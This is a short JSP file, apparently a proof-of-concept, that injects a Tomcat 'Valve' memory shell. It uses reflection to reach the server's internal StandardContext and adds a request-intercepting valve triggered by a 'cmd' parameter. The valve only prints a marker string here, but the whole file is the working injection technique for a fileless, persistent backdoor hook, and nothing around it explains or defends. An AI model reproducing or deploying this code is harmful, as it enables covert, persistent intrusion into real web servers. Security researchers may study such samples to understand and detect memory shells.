<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Valve" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %><%--
  Created by IntelliJ IDEA.
  User: Luc
  Date: 2022/12/20
  Time: 15:03
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field standardContext = applicationContext.getClass().getDeclaredField("context");
    standardContext.setAccessible(true);
    StandardContext standardContext1 = (StandardContext) standardContext.get(applicationContext);

    ValveBase  valve = new ValveBase() {
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            if (request.getParameter("cmd")!=null){
                response.getWriter().write("valve 注入");
            }else {
                this.getNext().invoke(request,response);
            }
        }
    };

    standardContext1.getPipeline().addValve(valve);
%>
<html>
<head>
    <title>Title</title>
</head>
<body>

</body>
</html>
